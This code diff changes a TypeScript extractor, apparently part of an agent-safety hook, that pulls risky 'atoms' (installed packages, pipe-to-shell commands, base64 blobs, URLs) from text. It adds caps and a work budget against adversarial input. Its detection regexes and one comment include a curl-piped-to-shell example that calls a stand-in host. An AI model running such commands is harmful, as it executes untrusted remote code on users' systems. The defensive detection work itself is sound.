@@ -2,15 +2,38 @@ import { createHash } from 'node:crypto';
 import { expandVariants } from '../normalize/normalizer.js';
 import { DEFAULT_MAX_CHARS } from '../scan/scanner.js';
 import type { Atom } from '../types.js';
+import type { Positioned } from './atom-kinds.js';
+import { createAtomSet } from './atom-set.js';
+import { encodedAtoms } from './encoded-atoms.js';
 
-/** Upper bound on atoms extracted from one text (first N in text order, after dedupe). */
+/**
+ * Upper bound on the atoms that can raise the floor (a package, a pipe-to-shell, an encoded blob)
+ * extracted from one text: the first N in text order, after dedupe. Reaching it is a loss, and
+ * marks the session incomplete.
+ */
 export const MAX_ATOMS = 200;
+/**
+ * The same bound for URLs and hosts, which are counted apart. They cannot raise the floor, so
+ * the ones past it are left out without a word: a session that read a lot of links (a search, a
+ * lockfile, a page of documentation) is not a session that lost evidence, and they must not use up
+ * the room a package needs.
+ */
+export const MAX_NETWORK_ATOMS = 200;
 const MAX_VALUE_CHARS = 512;
 // `restOfLine` scans at most this many characters past a runner/installer match.
 // A command line longer than this is truncated (trailing packages are missed), which
 // bounds the per-match scan cost and keeps package extraction linear instead of
-// quadratic on adversarial input that never hits a LINE_END character.
-const MAX_LINE_SCAN = 512;
+// quadratic on adversarial input that never hits a LINE_END character. A wrapped list of sixty
+// packages is about 1,300 characters once its lines are joined, so the window holds that; it is
+// the smallest power of two that does, because every doubling is another stretch of an indented
+// block that an installer's line runs through (see `wrappedCommandCut`).
+const MAX_LINE_SCAN = 2048;
+// The most characters read after runners and installers in one pass over a text, all matches
+// together. Each match reads its own line, and the lines of matches that sit on one long line
+// overlap, so `npm i a npm i a …` over 200,000 characters would read the window 25,000 times: four
+// seconds, inside a hook with nine. An honest text spends at most its own length (a line is read
+// once); past this, the matches that are left are not read and count as a line that was cut.
+const MAX_LINE_WORK = 262_144;
 
 // `|` ends a URL too: in `curl https://x.example/i.sh|sh` the pipe is shell syntax,
 // not part of the URL the command fetches.
@@ -65,15 +88,6 @@ const PACKAGE_FLAGS = new Set(['-p', '--package']);
 const PIPE_SHELL =
   /\b(?:curl|wget)\b[^\n|;&`]{0,400}\|\s*(?:sudo\s+(?:-E\s+)?)?(?:ba|z|da|k)?sh\b(?:\s+-[a-z]+)?/gi;
 const PROC_SUB_SHELL = /\b(?:ba|z|da|k)?sh\s+<\(\s*(?:curl|wget)\b[^)\n]{0,400}\)/gi;
-// Base64 runs of 24+ chars; `looksBase64` then requires mixed case plus a digit/symbol and rejects hex.
-const BASE64 = /(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{24,}={0,2}(?![A-Za-z0-9+/=])/g;
-const HEX = /^[0-9a-fA-F]+$/;
-
-/** An atom paired with the text index its source match started at, for cross-kind ordering. */
-interface Positioned {
-  readonly index: number;
-  readonly atom: Atom;
-}
 
 /**
  * `text` without the run of `chars` at its end. A loop, not a `[…]+$` pattern: that
@@ -117,6 +131,8 @@ export function normalizePackageName(raw: string): string {
 interface LineScan {
   readonly line: string;
   readonly cut: boolean;
+  /** How many characters of the text were looked at to find it. */
+  readonly read: number;
 }
 
 function restOfLine(text: string, from: number): LineScan {
@@ -125,6 +141,7 @@ function restOfLine(text: string, from: number): LineScan {
   return {
     line: (stop === -1 ? rest : rest.slice(0, stop)).trim(),
     cut: stop === -1 && text.length > from + MAX_LINE_SCAN,
+    read: stop === -1 ? rest.length : stop,
   };
 }
 
@@ -192,14 +209,26 @@ interface Found {
 }
 
 /** A runner or installer match with the rest of its line, positioned at the match's start. */
-function lineAfter(text: string, m: RegExpMatchArray): { index: number; scan: LineScan } {
-  const index = m.index ?? 0;
-  return { index, scan: restOfLine(text, index + m[0].length) };
+type LineAfter = (m: RegExpMatchArray) => { index: number; scan: LineScan };
+
+/**
+ * Reads the line after each match in turn, out of one budget for the pass (`MAX_LINE_WORK`). A
+ * match that finds the budget spent is given an empty line that was cut: it was not read.
+ */
+function lineReader(text: string): LineAfter {
+  let budget = MAX_LINE_WORK;
+  return (m) => {
+    const index = m.index ?? 0;
+    if (budget <= 0) return { index, scan: { line: '', cut: true, read: 0 } };
+    const scan = restOfLine(text, index + m[0].length);
+    budget -= scan.read + 1;
+    return { index, scan };
+  };
 }
 
 /** Every package named after a runner match, positioned at that match's start index. */
-function runnerPackages(text: string): Found {
-  const lines = [...text.matchAll(RUNNER)].map((m) => lineAfter(text, m));
+function runnerPackages(text: string, lineAfter: LineAfter): Found {
+  const lines = [...text.matchAll(RUNNER)].map(lineAfter);
   return {
     positioned: lines.flatMap(({ index, scan }): Positioned[] => {
       const pkg = runnerPackage(scan.line.split(/\s+/));
@@ -212,8 +241,8 @@ function runnerPackages(text: string): Found {
 }
 
 /** Every package named after an installer match, positioned at that match's start index. */
-function installedPackages(text: string): Found {
-  const lines = [...text.matchAll(INSTALLER)].map((m) => lineAfter(text, m));
+function installedPackages(text: string, lineAfter: LineAfter): Found {
+  const lines = [...text.matchAll(INSTALLER)].map(lineAfter);
   return {
     positioned: lines.flatMap(({ index, scan }): Positioned[] =>
       installerPackages(scan.line.split(/\s+/)).flatMap((pkg): Positioned[] => {
@@ -244,8 +273,8 @@ function urlAtoms(text: string): Positioned[] {
   return [...fromUrls, ...fromSsh];
 }
 
-/** How much text after an installer is looked at to see whether its wrapped lines outgrow the window. */
-const WRAP_SCAN = 8 * MAX_LINE_SCAN;
+/** How much text after an installer is looked at to see whether it is the start of a wrapped command. */
+const WRAP_SCAN = MAX_LINE_SCAN;
 
 const skipBlanks = (text: string, from: number): number => {
   let at = from;
@@ -271,6 +300,41 @@ function startsWrapped(tail: string): boolean {
 }
 
 /**
+ * Whether the command that starts at `from`, with each indented continuation line joined to the
+ * line before it by one space (what `collapseContinuations` makes of it), outgrows the line
+ * window with no line end inside it: what `restOfLine` reports as cut for the joined text. It
+ * walks the text as written instead of building the joined text, and stops at the window, so a
+ * wrapped command costs the window and not the length of the text after it.
+ */
+function joinedLineOutgrows(text: string, from: number): boolean {
+  let at = from;
+  let length = 0;
+  while (at < text.length) {
+    if (length >= MAX_LINE_SCAN) return true;
+    const char = text.charAt(at);
+    const newline = char === '\r' && text.charAt(at + 1) === '\n' ? at + 1 : at;
+    if (text.charAt(newline) === '\n') {
+      const next = skipBlanks(text, newline + 1);
+      if (next === newline + 1) return false;
+      at = next;
+    } else {
+      if (isLineEnd(text, at)) return false;
+      at += 1;
+    }
+    length += 1;
+  }
+  return false;
+}
+
+/** Whether `LINE_END` matches at `at` (a line break aside), which is what ends the part of a command that is read. */
+function isLineEnd(text: string, at: number): boolean {
+  const char = text.charAt(at);
+  return (
+    char === '|' || char === ';' || char === '`' || (char === '&' && text.charAt(at + 1) === '&')
+  );
+}
+
+/**
  * Whether a wrapped runner or installer outgrows the line window once its lines are joined,
  * which leaves its last arguments, a package among them, past the part that is read.
  *
@@ -285,16 +349,17 @@ function wrappedCommandCut(text: string): boolean {
   for (const pattern of [RUNNER, INSTALLER]) {
     for (const m of text.matchAll(pattern)) {
       const from = (m.index ?? 0) + m[0].length;
-      const tail = text.slice(from, from + WRAP_SCAN);
-      if (startsWrapped(tail) && restOfLine(collapseContinuations(tail), 0).cut) return true;
+      if (startsWrapped(text.slice(from, from + WRAP_SCAN)) && joinedLineOutgrows(text, from))
+        return true;
     }
   }
   return false;
 }
 
 function packageAtoms(text: string): Found {
-  const runners = runnerPackages(text);
-  const installers = installedPackages(text);
+  const lineAfter = lineReader(text);
+  const runners = runnerPackages(text, lineAfter);
+  const installers = installedPackages(text, lineAfter);
   return {
     positioned: [...runners.positioned, ...installers.positioned],
     cut: runners.cut || installers.cut,
@@ -310,37 +375,6 @@ function pipeShellAtoms(text: string): Positioned[] {
   }));
 }
 
-/**
- * A filesystem path passes every base64 test by accident, because `/` is in the
- * base64 alphabet: `/Users/dev/Documents/stroq` is mixed case, is not hex, and its
- * own separators satisfy the "has a digit or symbol" requirement. Treating it as an
- * encoded atom made ordinary work look copied from untrusted output — a path printed
- * by one tool and then used in a command scored `origin.untrusted`.
- *
- * Real base64 places a `/` about once every 64 characters, so its slash-free runs
- * stay long, while a path is short word segments between separators. Requiring at
- * least two separators keeps that distinction from firing on a base64 token that
- * merely happens to contain one slash.
- */
-const PATH_SEGMENT_MAX = 16;
-
-function looksLikePath(body: string): boolean {
-  const parts = body.split('/');
-  return parts.length >= 3 && parts.every((part) => part.length <= PATH_SEGMENT_MAX);
-}
-
-function looksBase64(token: string): boolean {
-  const body = token.replace(/=+$/, '');
-  if (looksLikePath(body)) return false;
-  return !HEX.test(body) && /[a-z]/.test(body) && /[A-Z]/.test(body) && /[0-9+/]/.test(body);
-}
-
-function encodedAtoms(text: string): Positioned[] {
-  return [...text.matchAll(BASE64)]
-    .filter((m) => looksBase64(m[0]))
-    .map((m): Positioned => ({ index: m.index ?? 0, atom: { kind: 'encoded', value: m[0] } }));
-}
-
 export function atomHash(atom: Atom): string {
   return createHash('sha256').update(`${atom.kind}\n${atom.value}`).digest('hex').slice(0, 32);
 }
@@ -349,10 +383,12 @@ export function atomHash(atom: Atom): string {
 export interface AtomExtraction {
   readonly atoms: Atom[];
   /**
-   * True when something that could have been an atom was left out: more distinct atoms than
-   * `MAX_ATOMS`, a runner or installer line longer than the part of it that is read, or text
+   * True when something that could have been an atom that raises the floor was left out: as
+   * many packages, pipe-to-shell and encoded atoms as `MAX_ATOMS` (it cannot tell that there
+   * were not more), a runner or installer line longer than the part of it that is read, or text
    * past the characters `extractAtomsDeepWithLoss` reads. An atom that was left out looks, to
-   * a later lookup, like content the session never read.
+   * a later lookup, like content the session never read. URLs and hosts left out at
+   * `MAX_NETWORK_ATOMS` are not a loss: no lookup of one can raise the floor.
    */
   readonly truncated: boolean;
 }
@@ -360,7 +396,7 @@ export interface AtomExtraction {
 /** One extraction pass, with the two ways a bound can cut it told apart. */
 interface Extraction {
   readonly atoms: Atom[];
-  /** More distinct atoms were found than `MAX_ATOMS` keeps. */
+  /** More distinct atoms that raise the floor were found than `MAX_ATOMS` keeps. */
   readonly capped: boolean;
   /** A runner or installer line went on past the part of it that is read. */
   readonly lineCut: boolean;
@@ -375,26 +411,17 @@ function extractBounded(text: string): Extraction {
     ...encodedAtoms(text),
   ];
   positioned.sort((a, b) => a.index - b.index);
-  const seen = new Set<string>();
-  const unique: Atom[] = [];
-  let capped = false;
+  const set = createAtomSet(MAX_ATOMS, MAX_NETWORK_ATOMS);
   for (const { atom } of positioned) {
-    const value = atom.value.slice(0, MAX_VALUE_CHARS);
-    const key = `${atom.kind}\n${value}`;
-    if (seen.has(key)) continue;
-    if (unique.length >= MAX_ATOMS) {
-      capped = true;
-      break;
-    }
-    seen.add(key);
-    unique.push({ kind: atom.kind, value });
+    set.add({ kind: atom.kind, value: atom.value.slice(0, MAX_VALUE_CHARS) });
   }
-  return { atoms: unique, capped, lineCut: packages.cut };
+  return { atoms: set.atoms, capped: set.floorLeftOut, lineCut: packages.cut };
 }
 
 /**
  * Extracts actionable atoms — the pieces of text an agent could copy into a
- * dangerous action — in text order, deduped, capped at MAX_ATOMS. Every extractor
+ * dangerous action — in text order, deduped, capped at MAX_ATOMS packages, pipe-to-shell
+ * and encoded atoms and, apart, at MAX_NETWORK_ATOMS URLs and hosts. Every extractor
  * tags each atom with the text index its source match started at, so atoms are
  * merged and sorted into true text order *before* the cap is applied — otherwise
  * the first-in-text (often most dangerous) atom could be dropped in favor of a
@@ -467,7 +494,8 @@ export function extractAtomsDeep(text: string): Atom[] {
  * tell a dropped atom from one that was never there. A session that dropped one has to say
  * so, or a later action carrying exactly that atom looks like it came from nowhere.
  *
- * Reaching `MAX_ATOMS` counts as a loss even when nothing more was found: the variants and
+ * Reaching `MAX_ATOMS` of the atoms that raise the floor counts as a loss even when nothing more
+ * was found: the variants and
  * the continuation pass after it are skipped once the cap is full, and what they would have
  * added cannot be known without paying for the passes the cap exists to avoid. A result that
  * holds exactly that many is read as cut, which costs nothing real.
@@ -479,26 +507,19 @@ export function extractAtomsDeep(text: string): Atom[] {
 export function extractAtomsDeepWithLoss(text: string): AtomExtraction {
   const cutText = text.length > DEFAULT_MAX_CHARS;
   const bounded = cutText ? text.slice(0, DEFAULT_MAX_CHARS) : text;
-  const seen = new Set<string>();
-  const out: Atom[] = [];
+  const set = createAtomSet(MAX_ATOMS, MAX_NETWORK_ATOMS);
   let truncated = cutText;
   const merge = (extraction: Extraction, byLine = true): void => {
     truncated = truncated || extraction.capped || (byLine && extraction.lineCut);
-    for (const atom of extraction.atoms) {
-      if (out.length >= MAX_ATOMS) return;
-      const key = atomHash(atom);
-      if (seen.has(key)) continue;
-      seen.add(key);
-      out.push(atom);
-    }
+    for (const atom of extraction.atoms) set.add(atom);
   };
 
   for (const variant of expandVariants(bounded)) {
-    if (out.length >= MAX_ATOMS) break;
+    if (set.floorFull) break;
     merge(extractBounded(variant.text));
   }
 
-  if (out.length < MAX_ATOMS) {
+  if (!set.floorFull) {
     const collapsed = collapseContinuations(bounded);
     if (collapsed !== bounded) {
       merge(extractBounded(collapsed), false);
@@ -506,5 +527,5 @@ export function extractAtomsDeepWithLoss(text: string): AtomExtraction {
     }
   }
 
-  return { atoms: out, truncated: truncated || out.length >= MAX_ATOMS };
+  return { atoms: set.atoms, truncated: truncated || set.floorFull || set.floorLeftOut };
 }
